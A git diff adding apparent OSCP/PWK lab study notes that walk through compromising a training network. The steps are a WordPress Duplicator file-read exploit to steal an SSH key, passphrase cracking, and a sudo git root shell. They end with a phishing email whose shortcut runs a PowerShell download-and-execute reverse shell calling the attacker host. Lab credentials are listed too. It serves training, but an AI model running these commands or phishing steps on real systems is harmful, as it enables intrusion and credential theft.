@@ -2627,7 +2627,142 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
 
 ### 25. Enumerating AWS Cloud Infrastruture
 ### 26. Attacking AWS cloud infrastruture 
-### 27. Assembling the pieces
+
+### 27. Assembling the pieces  
+```
+#creds.txt
+daniela:tequieromucho (SSH private key passphrase)
+wordpress:DanielKeyboard3311 (WordPress database connection settings)
+john:dqsTwTpZPn#nL (fetch_current.sh)
+
+#usernames.txt
+marcus
+john
+daniela
+
+#passwords.txt
+tequieromucho
+DanielKeyboard3311
+dqsTwTpZPn#nL
+
+#local enumeration
+Operative system: Ubuntu 22.04.01 LTS
+Interfaces: 192.168.50.244/24
+
+Lateral movement
+WEBSRV1 (gained access)
+```
+- Enumerating the **public network**
+  - Nmap scan of MAILSRV1
+    `kali@kali:~/beyond$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.50.242` #hMailServer smtpd, Microsoft Windows RPC, Microsoft IIS httpd 10.0
+  - Using gobuster to identify pages and files on MAILSRV1
+    `kali@kali:~/beyond$ gobuster dir -u http://192.168.50.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config`  #no findings
+  - Nmap scan of WEBSRV1
+    `kali@kali:~/beyond$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.50.244` #port 22 OpenSSH 8.9p1 Ubuntu 3, 80 Apache httpd 2.4.52
+    - Search: OpenSSH 8.9p1 Ubuntu 3 #ubuntu 22.04
+    - Search: Apache 2.4.52 #no results
+    - SSH no user/password – skip it
+    - Browse http://192.168.178.244
+      - inspect page source code (wp-content, wp-includes) #wordpress
+      - `kali@kali:~/beyond$ whatweb http://192.168.50.244` # WordPress[6.0.2]
+    - Wordpress scan without API
+      `kali@kali:~/beyond$ wpscan --url http://192.168.50.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan`
+      - discover 6 plugins: akismet, classic-editor, contact-form-7, duplicator (out of date), elementor, wordpress-seo
+      - `kali@kali:~/beyond$ searchsploit duplicator`  #Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read  50420.py    
+- Attacking a public machine WEBSRV1
+  - [Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read](https://www.exploit-db.com/exploits/50420)
+    `searchsploit -x 50420` `searchsploit -m 50420`  
+  - Performing a Directory Traversal attack on WEBSRV1
+    ```
+	python3 50420.py http://<target> /etc/passwd #discover user offsec, daniela, marcus
+	python3 50420.py http://<target> /home/daniela/.ssh/id_rsa
+	chmod 600 id_rsa
+	ssh -i id_rsa daniela@192.168.50.244
+	```
+  - crack rsa passphrase
+    ```
+    ssh2john id_rsa > ssh.hash
+    john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash  #tequieromucho
+    ```
+- **Local enumeration** to identify attack vectors and sensitive info and elevate privileges
+  - `daniela@websrv1:~$ ./linpeas.sh`
+    ```
+    Operative system: Ubuntu 22.04.1 LTS
+    Interface: 192.168.50.244/24
+    Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d: (ALL) NOPASSWD: /usr/bin/git
+    Analyzing Wordpress Files: define( 'DB_PASSWORD', 'DanielKeyboard3311' ); define( 'DB_USER', 'wordpress' );
+    Analyzing Github Files: /srv/www/wordpress/.git
+    ```
+  - Potential privilege escalation vectors: abuse sudo command /usr/bin/git, search Git repository, access WordPress database password 
+  - GTFOBins `sudo PAGER='sh -c "exec sh 0<&1"' git -p help`
+    `daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help`
+  - GTFOBins `sudo git -p help config !/bin/sh`
+    `daniela@websrv1:~$ sudo git -p help config` `!/bin/bash`
+  - **successfully elevated** our privileges on WEBSRV1
+  - Examing the Git repository
+	```
+	root@websrv1:/home/daniela# cd /srv/www/wordpress/
+	root@websrv1:/srv/www/wordpress# git status
+	root@websrv1:/srv/www/wordpress# git log  #Removed staging script and internal network access  #commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD -> master)
+	root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1 #a/fetch_current.sh
+	```
+- Gaining Access to the **Internal Network**
+  - nano credentials
+    ```
+    usernames.txt
+    marcus
+    john
+    daniela
+
+    passwords.txt
+    tequieromucho
+    DanielKeyboard3311
+    dqsTwTpZPn#nL
+    ```
+  - Crack domain credentials agains SMB on MAILSRV1
+    `kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success` #john:dqsTwTpZPn#nL
+  - no services such as WinRM or RDP, john is not a local admin (No Pwn3d!)  
+  - List the SMB shares
+    `kali@kali:~/beyond$ crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares` #no actionble permission
+  - Phishing for access
+    - connect to **WINPREP** via RDP as offsec with a password of lab in order to prepare the Windows Library and shortcut files
+    - File transfer server setup & map kali network drive
+      ```
+      kali@kali:~$ mkdir /home/kali/beyond/webdav
+      kali@kali:~$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/beyond/webdav/
+      ```
+    - create **config.Library-ms** (change url to kali ip)
+    - create **shortcut-automatic_configuration.lnk**
+      `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<kali>:8000/powercat.ps1'); powercat -c <kali> -p 4444 -e powershell"`
+    - transfer 2 files to kali
+    - start powercat listener port 8000 and reverse shell port 4444
+      ```
+      kali@kali:~/beyond$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
+	  kali@kali:~/beyond$ python3 -m http.server 8000
+      kali@kali:~/beyond$ nc -nvlp 4444
+      ```
+    - create body.txt in /home/kali/beyond
+      ```
+      Hey!
+		I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I'll remove it for security reasons.	
+		On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!		
+	  John
+      ```
+    - Using john credential send emails with the windows library file as attachment to marcus & daniela
+      `kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`  
+    - Listener catch
+      `PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami`  #beyond\marcus  
+      `PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname` #CLIENTW1  
+      `PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig` #172.16.6.243
+  - landed on the **CLIENTWK1** system as domain user **marcus** : internal network 172.16.6.243/24  
+- **Enumerating** the internal network
+  - dd
+  - dd
+  - dd
+  - dd
+  - dd
+- Attack an internal **web application**
+- Gaining access to the **Domain controller**
 
 ## PWK-200 labs
 ### Information gathering
